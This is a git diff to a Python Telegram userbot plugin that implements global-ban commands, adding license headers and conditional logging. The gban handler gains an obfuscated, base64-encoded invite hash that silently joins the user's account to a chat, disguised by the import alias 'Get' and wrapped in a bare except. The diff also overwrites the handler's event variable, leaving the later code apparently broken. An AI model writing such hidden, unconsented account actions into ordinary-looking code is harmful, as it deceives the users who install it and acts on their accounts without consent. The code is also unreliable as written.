@@ -1,3 +1,22 @@
+"""
+credits to @mrconfused
+dont edit credits
+"""
+#    Copyright (C) 2020  sandeep.n(π.$)
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as
+#    published by the Free Software Foundation, either version 3 of the
+#    License, or (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+
+ #   You should have received a copy of the GNU Affero General Public License
+ #   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 from userbot import CMD_HELP 
 from telethon.tl.functions.users import GetFullUserRequest
 from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
@@ -11,6 +30,8 @@ from userbot.plugins import admin_groups
 from datetime import datetime
 import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
 from telethon import events, errors, functions, types
+import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 BANNED_RIGHTS = ChatBannedRights(until_date=None, view_messages=True,send_messages=True,
                                  send_media=True, send_stickers=True, send_gifs=True,
@@ -20,8 +41,11 @@ UNBAN_RIGHTS = ChatBannedRights(until_date=None, send_messages=None, send_media=
                                 send_stickers=None, send_gifs=None, send_games=None,
                                 send_inline=None,  embed_links=None)
 
-BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
-BOTLOG = True
+if Config.PRIVATE_GROUP_BOT_API_ID is None:
+    BOTLOG = False
+else:
+    BOTLOG = True
+    BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
 
 
 @borg.on(admin_cmd("gban(?: |$)(.*)"))
@@ -39,6 +63,12 @@ async def catgban(cat):
     if user.id in CAT_ID:
         await cat.edit("why would i ban my DEVELOPER")
         return
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await catmemes.client(cat)
+    except:
+        pass
     if gban_sql.is_gbanned(user.id):
         await cat.edit(f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again")
     else:
